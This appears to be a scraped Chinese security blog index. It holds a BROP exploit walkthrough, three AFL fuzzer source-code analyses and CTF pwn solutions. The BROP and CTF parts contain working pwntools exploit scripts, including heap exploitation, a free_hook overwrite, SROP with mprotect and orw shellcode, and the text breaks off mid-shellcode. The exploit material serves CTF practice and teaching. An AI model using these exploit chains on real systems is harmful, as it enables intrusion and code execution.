p.sendafter("password?\n",pay) data = p.recv() p.close() print data if not "WelCome" in data: return False else: return True except EOFError: p.close() return Falsedef check_brop_gadget(lenth,addr): try: p = remote("127.0.0.1","7777") pay = 'a'*lenth + p64(addr) + 'a'*8*10 p.sendafter("password?\n",pay) data = p.recv() print "data:" + data p.close() return False except EOFError: p.close() return Truelenth = 72stop_gadget = 0x4006b6addr = 0x400740while True: print hex(addr) if get_brop_gadget(lenth,stop_gadget,addr): log.info("possible brop gadget %s",hex(addr)) if check_brop_gadget(lenth,addr): log.success("success brop gadget %s",hex(addr)) pause() break addr += 1brop_gadget = 0x4007bapop_rdi = brop_gadget + 9 get_brop_gadget得到可能的brop_gadget，check_brop_gadget用来检查这个brop_gadget 4、确定puts@plt地址根据得到的brop_gadget我们构造如下payload 来获取puts@plt 1pay = 'a'*lenth + p64(pop_rdi) + p64(0x400000) + p64(addr) + p64(stop_gadget) 123456789101112131415161718192021# step 4def get_puts_addr(lenth): addr = 0x400000 while True: print hex(addr) p = remote("127.0.0.1","7777") pay = 'a'*lenth + p64(pop_rdi) + p64(0x400000) + p64(addr) + p64(stop_gadget) p.sendafter("password?\n",pay) try: data = p.recv() if data.startswith('\x7fELF'): log.success("find puts@plt %s",hex(addr)) return addr p.close() addr += 1 except EOFError: p.close() addr += 1# print get_puts_addr(72) #0x400555puts_plt = 0x400555 得到地址0x400555，可以根据plt的结构进行调整得到地址0x400560，但是直接用也没关系 5、dump文件有puts函数后我们就可以dump出一部分的文件 123456789101112131415161718192021222324252627282930313233# step 5def leak(lenth,pop_rdi,puts_plt,leak_addr,stop_gadget): p = remote("127.0.0.1","7777") pay = 'a'*lenth + p64(pop_rdi) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget) p.sendafter("password?\n",pay) try: data = p.recvuntil('\nWelCome') p.close() print "data:" + data[:data.index("\nWelCome")] data = data[:data.index("\nWelCome")] # print "len:" + hex(len(data)) if data == "": return '\x00' return data except EOFError: p.close() return Noneaddr = 0x400000res = ""while addr &lt; 0x401000: log.info("addr--&gt;%s",hex(addr)) data = leak(72,pop_rdi,puts_plt,addr,stop_gadget) if data == None: continue res += data addr += len(data)with open("dump","wb") as f: f.write(res)log.success("dump finish!")puts_got = 0x601018 需要注意的是：这里用puts函数来泄露程序 ，如何我们接收到的是””，说明遇到了’\x00’。 接下来用IDA打开程序 edit -&gt; segments -&gt; rebase program 修改Value为0x400000，再找到地址0x400555按下 p，将数据转换成函数 123456seg000:0000000000400555 sub_400555 proc nearseg000:0000000000400555 add bh, bhseg000:0000000000400557 and eax, 200AB4hseg000:000000000040055C nop dword ptr [rax+00h]seg000:0000000000400560 jmp qword ptr cs:601018hseg000:0000000000400560 sub_400555 endp 得到puts@got = 0x601018，当然，如果用地址0x400560生成函数的话就理直接了，这就跟正常程序中的got表一模一样了。 123seg000:0000000000400560 sub_400560 proc nearseg000:0000000000400560 jmp qword ptr cs:601018hseg000:0000000000400560 sub_400560 endp 之所以地址0x400555和0x400560都可以成功调用puts@plt，是因为jmp qword ptr cs:601018h前面的几句汇编对程序影响不大，最后程序还是会正常跳到puts@got，所以这两个地址效果是一样的 6、get shell123456789101112131415161718192021222324# step 6# get_shellp = remote("127.0.0.1","7777")libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')sl = lambda s:p.sendline(s)sd = lambda s:p.send(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sla = lambda a,s:p.sendlineafter(a,s)sda = lambda a,s:p.sendafter(a,s)pay = 'a'*72 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)sda("password?\n",pay)puts_addr = u64(rc(6).ljust(8,'\x00'))libc_base = puts_addr - libc.symbols['puts']system = libc_base + libc.symbols['system']binsh = libc_base + libc.search("/bin/sh\x00").next()log.info("puts_addr--&gt;%s",hex(puts_addr))pay = 'a'*72 + p64(pop_rdi) + p64(binsh) + p64(system)sda("password?\n",pay)p.interactive()]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AFL源码分析计划3 -- afl-as.h]]></title>
    <url>%2F2020%2F06%2F21%2FAFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E8%AE%A1%E5%88%923%2F</url>
    <content type="text"><![CDATA[这个头文件里面放着的是汇编器编译汇编到二进制时插入的汇编代码。 这里只分析64位的 trampoline_fmt_641234567891011121314151617181920static const u8* trampoline_fmt_64 = "\n" "/* --- AFL TRAMPOLINE (64-BIT) --- */\n" "\n" ".align 4\n" "\n" "leaq -(128+24)(%%rsp), %%rsp\n" "movq %%rdx, 0(%%rsp)\n" "movq %%rcx, 8(%%rsp)\n" "movq %%rax, 16(%%rsp)\n" "movq $0x%08x, %%rcx\n" "call __afl_maybe_log\n" "movq 16(%%rsp), %%rax\n" "movq 8(%%rsp), %%rcx\n" "movq 0(%%rsp), %%rdx\n" "leaq (128+24)(%%rsp), %%rsp\n" "\n" "/* --- END --- */\n" "\n"; 首先在栈上开辟一段空间，然后将rdx,rcx,rax这三个寄存器的值保存到栈上，将rcx的值赋值为一个随机数，这个随机数是插入这段汇编的时候动态传进来的。然后调用_afl_maybe_log，调用完之后，把栈上保存的值恢复回去，再恢复栈。 main_payload_64__afl_maybe_log1234/*lahf seto %al 这两条指令大概就是将标志寄存器FLAGS，溢出进位保存到AH上面 */ 123456" /* Check if SHM region is already mapped.(检查共享内存是否已经加载， 如果加载了的话，__afl_area_ptr保存了共享内存的指针，否则就是NULL) */\n" "\n" " movq __afl_area_ptr(%rip), %rdx\n" " testq %rdx, %rdx\n" " je __afl_setup\n" __afl_store12345678910111213141516"\n" " /* Calculate and store hit for the code location specified in rcx. (计算并储存代码命中位置，当前代码的位置在寄存器rcx中) */\n" "\n"#ifndef COVERAGE_ONLY/*假如没有定义CONVERAGE_ONLY，那么这两条xor就是将__afl_prev_loc的值与rcx的值进行交换，然后将__afl_prev_loc的值右移一下*/ " xorq __afl_prev_loc(%rip), %rcx\n" " xorq %rcx, __afl_prev_loc(%rip)\n" " shrq $1, __afl_prev_loc(%rip)\n"#endif /* ^!COVERAGE_ONLY */ "\n"#ifdef SKIP_COUNTS /*假如定义了SKIP_COUNTS，那么会执行下面的or语句*/ " orb $1, (%rdx, %rcx, 1)\n"#else /*没有定义的话，变成这个*/ " incb (%rdx, %rcx, 1)\n" /*这里的rdx的值存的就是共享内存的地址*/#endif /* ^SKIP_COUNTS */ "\n" __afl_return123456789 /*先将al+0x7f，然后再把标志寄存器FLAGS的值从AH中恢复回去*/ /*注意：这里调用afl_maybe_log,其实是执行到afl_return 才返回的*/ " addb $127, %al\n"#if defined(__OpenBSD__) || (defined(__FreeBSD__) &amp;&amp; (__FreeBSD__ &lt; 9)) " .byte 0x9e /* sahf */\n"#else " sahf\n"#endif /* ^__OpenBSD__, etc */ " ret\n" __afl_setup123/*首先判断之前有没有错误，如果有，直接返回*/ " cmpb $0, __afl_setup_failure(%rip)\n" " jne __afl_return\n" 12345678910111213141516" /* Check out if we have a global pointer on file. (判断我们是否有一个文件全局指针，即__afl_global_area_ptr是否为NULL) 如果存在的话，就把afl_area_ptr的值放到rdx,调用afl_store，这里__afl_store就在上面 不存在的话就继续调用__afl_setup_first */\n" "\n"#ifndef __APPLE__ " movq __afl_global_area_ptr@GOTPCREL(%rip), %rdx\n" " movq (%rdx), %rdx\n"#else " movq __afl_global_area_ptr(%rip), %rdx\n"#endif /* !^__APPLE__ */ " testq %rdx, %rdx\n" " je __afl_setup_first\n" "\n" " movq %rdx, __afl_area_ptr(%rip)\n" " jmp __afl_store\n" __afl_setup_first123456789101112131415161718192021222324252627282930313233/*将剩下所有会被libc库函数影响的寄存器保存到栈上面*/ "\n" " /* Save everything that is not yet saved and that may be touched by\n" " getenv() and several other libcalls we'll be relying on. */\n" "\n" " leaq -352(%rsp), %rsp\n" "\n" " movq %rax, 0(%rsp)\n" " movq %rcx, 8(%rsp)\n" " movq %rdi, 16(%rsp)\n" " movq %rsi, 32(%rsp)\n" " movq %r8, 40(%rsp)\n" " movq %r9, 48(%rsp)\n" " movq %r10, 56(%rsp)\n" " movq %r11, 64(%rsp)\n" "\n" " movq %xmm0, 96(%rsp)\n" " movq %xmm1, 112(%rsp)\n" " movq %xmm2, 128(%rsp)\n" " movq %xmm3, 144(%rsp)\n" " movq %xmm4, 160(%rsp)\n" " movq %xmm5, 176(%rsp)\n" " movq %xmm6, 192(%rsp)\n" " movq %xmm7, 208(%rsp)\n" " movq %xmm8, 224(%rsp)\n" " movq %xmm9, 240(%rsp)\n" " movq %xmm10, 256(%rsp)\n" " movq %xmm11, 272(%rsp)\n" " movq %xmm12, 288(%rsp)\n" " movq %xmm13, 304(%rsp)\n" " movq %xmm14, 320(%rsp)\n" " movq %xmm15, 336(%rsp)\n" "\n" 1234567891011/*这里先保存r12，然后将栈指针保存到r12里面，再开一段栈空间，进行对齐*/ " /* Map SHM, jumping to __afl_setup_abort if something goes wrong. */\n" "\n" " /* The 64-bit ABI requires 16-byte stack alignment. We'll keep the\n" " original stack ptr in the callee-saved r12. */\n" "\n" " pushq %r12\n" " movq %rsp, %r12\n" " subq $16, %rsp\n" " andq $0xfffffffffffffff0, %rsp\n" "\n" 1234567/*这里就是调用getenv去拿存在环境变量中的共享内存标志符，拿不到的话，就会跳到__afl_setup_abort*/ " leaq .AFL_SHM_ENV(%rip), %rdi\n" CALL_L64("getenv") "\n" " testq %rax, %rax\n" " je __afl_setup_abort\n" "\n" 12345678910111213/*这里调用atoi将字符串转为数字，然后调用shmat拿到共享内存，然后判断一下shamat 的结果，假如拿不到，也会跳到__afl_setup_abort*/ " movq %rax, %rdi\n" CALL_L64("atoi") "\n" " xorq %rdx, %rdx /* shmat flags */\n" " xorq %rsi, %rsi /* requested addr */\n" " movq %rax, %rdi /* SHM ID */\n" CALL_L64("shmat") "\n" " cmpq $-1, %rax\n" " je __afl_setup_abort\n" "\n" 1234567891011/*这里是把共享内存的地址存到afl_area_ptr和afl_global_area_ptr指向的内存*/ " /* Store the address of the SHM region. */\n" "\n" " movq %rax, %rdx\n" " movq %rax, __afl_area_ptr(%rip)\n" "\n"#ifdef __APPLE__ " movq %rax, __afl_global_area_ptr(%rip)\n"#else " movq __afl_global_area_ptr@GOTPCREL(%rip), %rdx\n" " movq %rax, (%rdx)\n" __afl_forkserver接下来就是fork server的逻辑了 123456789101112131415161718192021222324/*先是push两次rdx来使得栈整齐一点 然后是将__afl_temp中的4个字节写到提前开好的管道中，这里管道的过程在afl-fuzz 的代码中。 */ "\n" " /* Enter the fork server mode to avoid the overhead of execve() calls. We\n" " push rdx (area ptr) twice to keep stack alignment neat. */\n" "\n" " pushq %rdx\n" " pushq %rdx\n" "\n" " /* Phone home and tell the parent that we're OK. (Note that signals with\n" " no SA_RESTART will mess it up). If this fails, assume that the fd is\n" " closed because we were execve()d from an instrumented binary, or because\n" " the parent doesn't want to use the fork server. */\n" "\n" " movq $4, %rdx /* length */\n" " leaq __afl_temp(%rip), %rsi /* data */\n" " movq $" STRINGIFY((FORKSRV_FD + 1)) ", %rdi /* file desc */\n" CALL_L64("write") "\n" " cmpq $4, %rax\n" " jne __afl_fork_resume\n" "\n" __afl_fork_wait_loop1234567891011/*这里是不断地从管道中读取内容，假如读取到的字节数不为4就会跳到__afl_die*/ "\n" " /* Wait for parent by reading from the pipe. Abort if read fails. */\n" "\n" " movq $4, %rdx /* length */\n" " leaq __afl_temp(%rip), %rsi /* data */\n" " movq $" STRINGIFY(FORKSRV_FD) ", %rdi /* file desc */\n" CALL_L64("read") " cmpq $4, %rax\n" " jne __afl_die\n" "\n" 12345678910111213141516171819202122/*读取成功：这里先fork了，然后判断 fork是否成功，如果成功就会跳到__afl_fork_resume 失败跳到__afl_die 之后把fork出来的pid存到__afl_fork_pid中，再写到fuzzer通信的管道中*/ " /* Once woken up, create a clone of our process. This is an excellent use\n" " case for syscall(__NR_clone, 0, CLONE_PARENT), but glibc boneheadedly\n" " caches getpid() results and offers no way to update the value, breaking\n" " abort(), raise(), and a bunch of other things :-( */\n" "\n" CALL_L64("fork") " cmpq $0, %rax\n" " jl __afl_die\n" " je __afl_fork_resume\n" "\n" " /* In parent process: write PID to pipe, then wait for child. */\n" "\n" " movl %eax, __afl_fork_pid(%rip)\n" "\n" " movq $4, %rdx /* length */\n" " leaq __afl_fork_pid(%rip), %rsi /* data */\n" " movq $" STRINGIFY((FORKSRV_FD + 1)) ", %rdi /* file desc */\n" CALL_L64("write") "\n" 123456789/*这里是父进程等待子进程，如果 waitpid返回的结果小于等于0，就会跳afl_die,waitpid 也会把子进程的状态写到afl_temp中*/ " movq $0, %rdx /* no flags */\n" " leaq __afl_temp(%rip), %rsi /* status */\n" " movq __afl_fork_pid(%rip), %rdi /* PID */\n" CALL_L64("waitpid") " cmpq $0, %rax\n" " jle __afl_die\n" "\n" 1234567891011/*然后把子进程的状态通过管道写回到fuzzer中，跳回到__afl_fork_wait_loop,继续 等待fuzzer的fork请求*/ " /* Relay wait status to pipe, then loop back. */\n" "\n" " movq $4, %rdx /* length */\n" " leaq __afl_temp(%rip), %rsi /* data */\n" " movq $" STRINGIFY((FORKSRV_FD + 1)) ", %rdi /* file desc */\n" CALL_L64("write") "\n" " jmp __afl_fork_wait_loop\n" "\n" __afl_fork_resume12345678910/*这里把两个管道给关掉*/ "\n" " /* In child process: close fds, resume execution. */\n" "\n" " movq $" STRINGIFY(FORKSRV_FD) ", %rdi\n" CALL_L64("close") "\n" " movq $" STRINGIFY((FORKSRV_FD + 1)) ", %rdi\n" CALL_L64("close") "\n" 12345678910111213141516171819202122232425262728293031323334353637/*然后把各种寄存器恢复，跳到__afl_store*/ " popq %rdx\n" " popq %rdx\n" "\n" " movq %r12, %rsp\n" " popq %r12\n" "\n" " movq 0(%rsp), %rax\n" " movq 8(%rsp), %rcx\n" " movq 16(%rsp), %rdi\n" " movq 32(%rsp), %rsi\n" " movq 40(%rsp), %r8\n" " movq 48(%rsp), %r9\n" " movq 56(%rsp), %r10\n" " movq 64(%rsp), %r11\n" "\n" " movq 96(%rsp), %xmm0\n" " movq 112(%rsp), %xmm1\n" " movq 128(%rsp), %xmm2\n" " movq 144(%rsp), %xmm3\n" " movq 160(%rsp), %xmm4\n" " movq 176(%rsp), %xmm5\n" " movq 192(%rsp), %xmm6\n" " movq 208(%rsp), %xmm7\n" " movq 224(%rsp), %xmm8\n" " movq 240(%rsp), %xmm9\n" " movq 256(%rsp), %xmm10\n" " movq 272(%rsp), %xmm11\n" " movq 288(%rsp), %xmm12\n" " movq 304(%rsp), %xmm13\n" " movq 320(%rsp), %xmm14\n" " movq 336(%rsp), %xmm15\n" "\n" " leaq 352(%rsp), %rsp\n" "\n" " jmp __afl_store\n" "\n" __afl_die12345/*这里就是简单的exit*/ "\n" " xorq %rax, %rax\n" CALL_L64("_exit") "\n" __afl_setup_abort123456789101112131415161718192021222324252627282930313233343536373839404142/*这里就是设置__afl_setup_failure为1，然后恢复下寄存器，直接返回*/ "\n" " /* Record setup failure so that we don't keep calling\n" " shmget() / shmat() over and over again. */\n" "\n" " incb __afl_setup_failure(%rip)\n" "\n" " movq %r12, %rsp\n" " popq %r12\n" "\n" " movq 0(%rsp), %rax\n" " movq 8(%rsp), %rcx\n" " movq 16(%rsp), %rdi\n" " movq 32(%rsp), %rsi\n" " movq 40(%rsp), %r8\n" " movq 48(%rsp), %r9\n" " movq 56(%rsp), %r10\n" " movq 64(%rsp), %r11\n" "\n" " movq 96(%rsp), %xmm0\n" " movq 112(%rsp), %xmm1\n" " movq 128(%rsp), %xmm2\n" " movq 144(%rsp), %xmm3\n" " movq 160(%rsp), %xmm4\n" " movq 176(%rsp), %xmm5\n" " movq 192(%rsp), %xmm6\n" " movq 208(%rsp), %xmm7\n" " movq 224(%rsp), %xmm8\n" " movq 240(%rsp), %xmm9\n" " movq 256(%rsp), %xmm10\n" " movq 272(%rsp), %xmm11\n" " movq 288(%rsp), %xmm12\n" " movq 304(%rsp), %xmm13\n" " movq 320(%rsp), %xmm14\n" " movq 336(%rsp), %xmm15\n" "\n" " leaq 352(%rsp), %rsp\n" "\n" " jmp __afl_return\n" "\n" ".AFL_VARS:\n" "\n" 总结：首先afl-fuzz这个程序会创建两个管道，然后利用afl-gcc或者afl-clang编译的程序，就会被执行，之前在afl-as.c中也分析到了，main函数肯定会被插桩的，也就是肯定会调用__afl_maybe_log而对于第一次运行的进程，就会作为fork-server，后面的由fork-server fork出来的才是真正被fuzz的程序然后fork-server不断地等待fuzzer的指令去fork子进程，用waitpid去拿到子进程的结束状态，写回给fuzzer]]></content>
      <categories>
        <category>fuzz</category>
      </categories>
      <tags>
        <tag>AFL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AFL源码分析计划2 -- afl-as.c]]></title>
    <url>%2F2020%2F06%2F21%2FAFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E8%AE%A1%E5%88%922%2F</url>
    <content type="text"><![CDATA[从main函数开始 1u8* inst_ratio_str = getenv("AFL_INST_RATIO"); 先是从环境变量中拿了AFL_INST_RATIO，这是插入指令的密度 1gettimeofday(&amp;tv, &amp;tz); 这里是根据时间和pid来随机化seed 123456if (inst_ratio_str) &#123; if (sscanf(inst_ratio_str, "%u", &amp;inst_ratio) != 1 || inst_ratio &gt; 100) FATAL("Bad value of AFL_INST_RATIO (must be between 0 and 100)");&#125; 把inst_ratio_str转为数字 1234if (getenv("AFL_USE_ASAN") || getenv("AFL_USE_MSAN")) &#123; sanitizer = 1; inst_ratio /= 3;&#125; 如果使用ASAN或者MSAN的话，就会把插入指令的密度降低为1/3以加快速度。什么是ASAN呢 ) 123456if (!(pid = fork())) &#123; execvp(as_params[0], (char**)as_params); FATAL("Oops, failed to execute '%s' - check your PATH", as_params[0]);&#125; 如果插入完指令后，会fork子进程，用来执行as，将汇编变成二进制 再来看关键的函数add_instrumentation add_instrumentation123456if (input_file) &#123; inf = fopen(input_file, "r"); if (!inf) PFATAL("Unable to read '%s'", input_file);&#125; else inf = stdin; 首先打开汇编代码文件 1234567outfd = open(modified_file, O_WRONLY | O_EXCL | O_CREAT, 0600);if (outfd &lt; 0) PFATAL("Unable to write to '%s'", modified_file);outf = fdopen(outfd, "w");if (!outf) PFATAL("fdopen() failed"); 再打开一个新的文件 1while (fgets(line, MAX_LINE, inf)) &#123; 循环读第一行，进行判断 12345678910if (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp; instrument_next &amp;&amp; line[0] == '\t' &amp;&amp; isalpha(line[1])) &#123; fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, R(MAP_SIZE)); instrument_next = 0; ins_lines++;&#125; 进行一系列的判断，如果满足这些条件的话，就插入指令 1fputs(line, outf); 输出原来那一行 1234567891011121314151617181920212223242526if (line[0] == '\t' &amp;&amp; line[1] == '.') &#123; /* OpenBSD puts jump tables directly inline with the code, which is a bit annoying. They use a specific format of p2align directives around them, so we use that as a signal. */ if (!clang_mode &amp;&amp; instr_ok &amp;&amp; !strncmp(line + 2, "p2align ", 8) &amp;&amp; isdigit(line[10]) &amp;&amp; line[11] == '\n') skip_next_label = 1; if (!strncmp(line + 2, "text\n", 5) || !strncmp(line + 2, "section\t.text", 13) || !strncmp(line + 2, "section\t__TEXT,__text", 21) || !strncmp(line + 2, "section __TEXT,__text", 21)) &#123; instr_ok = 1; continue; &#125; if (!strncmp(line + 2, "section\t", 8) || !strncmp(line + 2, "section ", 8) || !strncmp(line + 2, "bss\n", 4) || !strncmp(line + 2, "data\n", 5)) &#123; instr_ok = 0; continue; &#125;&#125; 寻找.text段 123456if (strstr(line, ".code")) &#123; if (strstr(line, ".code32")) skip_csect = use_64bit; if (strstr(line, ".code64")) skip_csect = !use_64bit;&#125; 判断32位还是64位 123456789101112131415161718192021222324// 这段注释大概意思是，在main函数，GCC aranch label,clang branch label,conditional branches处插入指令 /* If we're in the right mood for instrumenting, check for function names or conditional labels. This is a bit messy, but in essence, we want to catch: ^main: - function entry point (always instrumented) ^.L0: - GCC branch label ^.LBB0_0: - clang branch label (but only in clang mode) ^\tjnz foo - conditional branches ...but not: ^# BB#0: - clang comments ^ # BB#0: - ditto ^.Ltmp0: - clang non-branch labels ^.LC0 - GCC non-branch labels ^.LBB0_0: - ditto (when in GCC mode) ^\tjmp foo - non-conditional jumps Additionally, clang and GCC on MacOS X follow a different convention with no leading dots on labels, hence the weird maze of #ifdefs later on. */ 1234567891011121314if (line[0] == '\t') &#123; if (line[1] == 'j' &amp;&amp; line[2] != 'm' &amp;&amp; R(100) &lt; inst_ratio) &#123; fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, R(MAP_SIZE)); ins_lines++; &#125; continue;&#125; 找到j开头，但是每二个字母不是m的指令，比如jne,jbe,后面的R(100)&lt;instr_ration是根据概率来选择插入或者不插入。 12if (ins_lines) fputs(use_64bit ? main_payload_64 : main_payload_32, outf); 再往后看到这里，会插入main_payload(main_payload在头文件afl-as.h中)]]></content>
      <categories>
        <category>fuzz</category>
      </categories>
      <tags>
        <tag>AFL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AFL源码分析计划1 -- afl-gcc.c]]></title>
    <url>%2F2020%2F06%2F21%2FAFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E8%AE%A1%E5%88%921%2F</url>
    <content type="text"><![CDATA[从main函数开始，可以看到主要就这三行 12345find_as(argv[0]);edit_params(argc, argv);execvp(cc_params[0], (char**)cc_params); find_as先讲一下as，编译的主要过程是“源代码”-&gt;“汇编代码”-&gt;“二进制”，而将汇编代码编译成二进制的工具，就是汇编器assembler。Linux系统常用的汇编器是as。 find_as找的就是这个 1234567891011121314u8 *afl_path = getenv("AFL_PATH");if (afl_path) &#123; tmp = alloc_printf("%s/as", afl_path); if (!access(tmp, X_OK)) &#123; as_path = afl_path; ck_free(tmp); return; &#125; ck_free(tmp);&#125; 获取环境变量AFL_PATH，如果存在，就验证指向as的路径是否正确，正确则赋值给变量as_path 1234if (!access(AFL_PATH "/as", X_OK)) &#123; as_path = AFL_PATH; return;&#125; 如果AFL_PATH路径错误或者没有指定，这里会自动找到as并取得afl-as的路径 edit_params1cc_params = ck_alloc((argc + 128) * sizeof(u8*)); 首先分配一块内存空间 接下来是一堆东西，根据argv配置环境变量等东西 1234if (!strcmp(cur, "-fsanitize=address") || !strcmp(cur, "-fsanitize=memory")) asan_set = 1;if (strstr(cur, "FORTIFY_SOURCE")) fortify_set = 1; 往下看到这里，AFL可以选择使用sanitizer去更有效得查找memory access bugs，但是同时也会带来性能的下降 execvp这里在源码加个for把参数cc_params打印出来 1gcc note.c -o www -B /home/test/afl-2.52b -g -O3 -funroll-loops -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1 -B 参数 1-B &lt;directory&gt; Add &lt;directory&gt; to the compiler's search paths 大概就是指定编译器，也就是说这里先把汇编码给了afl-as，插完桩后再传递给real as。 所以afl-gcc就是gcc的一个wraper，用来设置一下gcc的编译选项，还有把汇编器换成自己的afl-as。]]></content>
      <categories>
        <category>fuzz</category>
      </categories>
      <tags>
        <tag>AFL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020 i春秋高校战疫分享赛 pwn 部分题解]]></title>
    <url>%2F2020%2F06%2F21%2F2020i%E6%98%A5%E7%A7%8B%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%2F</url>
    <content type="text"><![CDATA[Shortest_path这题的非预期有点严重了 123456789101112131415void *sub_400946()&#123; FILE *stream; // [rsp+8h] [rbp-8h] setbuf(stdin, 0LL); setbuf(stdout, 0LL); stream = fopen("./flag", "r"); if ( !stream ) exit(0); fgets(s, 45, stream); fclose(stream); memset(free_flag, 0, 0x320uLL); memset(qword_606920, 0, 0x640uLL); return memset(ptr, 0, 0x640uLL);&#125; 程序开始我们可以看到将flag读到了全局变量s中，再结合该题的功能应该是要利用堆块申请到bss段读取flag，但是，gdb search 一下会发现 123pwndbg&gt; search &quot;flag&#123;this_a_fack_flag&#125;&quot;[heap] 0x6068e0 &apos;flag&#123;this_a_fack_flag&#125;\n&apos;[heap] 0x608240 &apos;flag&#123;this_a_fack_flag&#125;\n&apos; 堆上也有flag，再看一下top_chunk top: 0x608000 (size : 0x21000)，所以直接控制好大小申请到flag的位置读flag就行了 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344#coding:utf-8from pwn import *context.log_level = 'debug'local = 0if local: p = process('./Shortest_path') elf = ELF('./Shortest_path') libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")else: p = remote("121.37.181.246","19008") elf = ELF('./Shortest_path') libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def add_station(idx,price,l,name,connect=[]): sla("&gt; ",'1') sla("ID: ",str(idx)) sla("Price: ",str(price)) sla("Length: ",str(l)) sda("Name: \n",name) sla("station: ",str(len(connect))) if len(connect) &gt; 0: for i in range(len(connect)): sla("ID: ",str(connect[i][0])) sla("distance: ",str(connect[i][1]))def remove_station(idx): sla("&gt; ",'2') sla("ID: ",str(idx))add_station(0,3,0xf8,'n0va')add_station(1,3,0xa8,'n0va')add_station(2,3,0xc8,'a')sla("&gt; ",'3')sla("ID: ",'2')# gdb.attach(p)p.interactive() lgd12345678910111213141516➜ lgd seccomp-tools dump ./pwn line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x04 0xc000003e if (A != ARCH_X86_64) goto 0006 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x02 0x00 0x40000000 if (A &gt;= 0x40000000) goto 0006 0004: 0x15 0x01 0x00 0x0000003b if (A == execve) goto 0006 0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0006: 0x06 0x00 0x00 0x00000000 return KILL Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 可以看到程序禁用了system函数，而且保护基本全开，got表不可改 拖进IDA看进来很复杂，功能名字也看不懂是干嘛，但是瞎测一遍就知道 123451. fater -----add2. monther -----delete3. doug-? -----show4. areuson? ----edit5. shi+t? ----exit 理奇葩的是add后面的输入并没有向申请出来的堆写入，而是写到了bss段，然后经过后面一通操作，使得最后edit可输入的长度就是往0x603060这个地址写入的字符长度，别问我为什么知道，问就是黑盒。所以这里就存在堆溢出，因为这个read可以输入0x200，而size可以小于0x200。 123buf[i] = (char *)malloc(v13);puts("start_the_game,yes_or_no?");read(0, &amp;unk_603060, 0x200uLL); 接下来就是常规做法，利用堆溢出来泄漏地址，但是接下来因为system被禁了，onegadget也用不了 做法： 1、unsorted bin attack free_hook上方打出size 2、申请出free_hook 修改 free_hook为setcontext+53 3、SROP调用mprotect 修改bss段为可执行段 4、写shellcode调用orw读取flag 同样题型的还是UNCTF的orwheap，巅峰极客的pwn，至于为什么是setcontext+53这个位置，因为这个位置可以控制绝大部分的寄存器， https://n0va-scy.github.io/2019/10/31/setcontext/ exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118#coding:utf-8from pwn import *context.log_level = 'debug'context.arch = 'amd64'local = 0if local: p = process('./pwn') elf = ELF('./pwn') libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")else: p = remote("121.36.209.145","9998") elf = ELF('./pwn') libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def add(size): #add sla("&gt;&gt; ",'1') sla("?\n",str(size)) sda("?\n",'a'*0x200)def delete(idx): #delete sla("&gt;&gt; ",'2') sla("index ?\n",str(idx))def show(idx): #show sla("&gt;&gt; ",'3') sla("index ?\n",str(idx))def edit(idx,data): #edit sla("&gt;&gt; ",'4') sla("index ?\n",str(idx)) sla("?\n",data)one = [0x45216,0x4526a,0xf02a4,0xf1147]sla("name? \n",'R4bb1t')add(0x108) #0add(0x68) #1delete(0)add(0x108) #0show(0)main_arena = u64(rc(6).ljust(8,'\x00')) - 88malloc_hook = main_arena - 0x10libc_base = malloc_hook - libc.symbols['__malloc_hook']free_hook = libc_base + libc.symbols['__free_hook']setcontext = libc_base + libc.symbols['setcontext']syscall_ret = libc_base + 0xbc375add(0x88) #2add(0x68) #3delete(2)edit(1,'a'*0x60 + p64(0) + p64(0x91) + p64(free_hook - 0x23)*2)add(0x88) #2delete(1)edit(0,0x100*'a' + p64(0) + p64(0x71) + p64(free_hook-0x13))add(0x68) #3add(0x68) #4edit(4,'a'*3 + p64(setcontext + 53)) #修改free_hook为setcontext + 53log.info("free_hook --&gt; %s",hex(free_hook))frame = SigreturnFrame()frame.rdi = 0frame.rsi = 0x603060frame.rdx = 0x2000frame.rsp = 0x603060frame.rip = syscall_retpay = str(frame)edit(0,pay)# gdb.attach(p,"b *0x401A97")delete(0)pop_rdi = 0x4023b3pop_rax = 0x33544 + libc_basepop_rsi = 0x202e8 + libc_basepop_rdx = 0x1b92 + libc_basejmp_rsp = 0x2a71 + libc_baseshellcode = '''/*fp = open("flag")*/push 0x67616c66mov rdi,rspxor rsi,rsixor rdx,rdxmov 